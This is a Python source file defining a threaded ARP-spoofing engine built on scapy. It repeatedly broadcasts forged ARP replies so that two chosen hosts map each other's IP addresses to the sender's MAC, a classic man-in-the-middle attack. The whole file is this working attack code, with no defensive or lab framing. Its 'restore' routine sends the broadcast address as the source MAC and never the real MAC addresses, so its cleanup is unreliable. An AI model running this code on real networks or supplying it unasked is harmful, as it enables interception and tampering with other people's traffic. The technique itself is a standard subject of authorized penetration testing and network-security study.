import threading
import time
from scapy.all import Ether, ARP, sendp, get_if_hwaddr


class ArpSpoofEngine:
    def __init__(self, iface: str, target_a: str, target_b: str, interval: int = 2):
        self.iface = iface
        self.target_a = target_a
        self.target_b = target_b
        self.interval = interval
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()

    def validate_targets(self) -> bool:
        return bool(self.target_a and self.target_b)

    def start(self) -> bool:
        if not self.validate_targets():
            return False
        if self._running:
            return False
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False
        self._stop_event.set()
        self._restore()

    def _spoof_loop(self) -> None:
        my_mac = get_if_hwaddr(self.iface)
        while not self._stop_event.is_set():
            try:
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_b, pdst=self.target_a,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)

                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_a, pdst=self.target_b,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
            except Exception:
                pass
            self._stop_event.wait(timeout=self.interval)

    def _restore(self) -> None:
        try:
            for _ in range(3):
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_b, pdst=self.target_a,
                    hwsrc="ff:ff:ff:ff:ff:ff", hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_a, pdst=self.target_b,
                    hwsrc="ff:ff:ff:ff:ff:ff", hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
        except Exception:
            pass
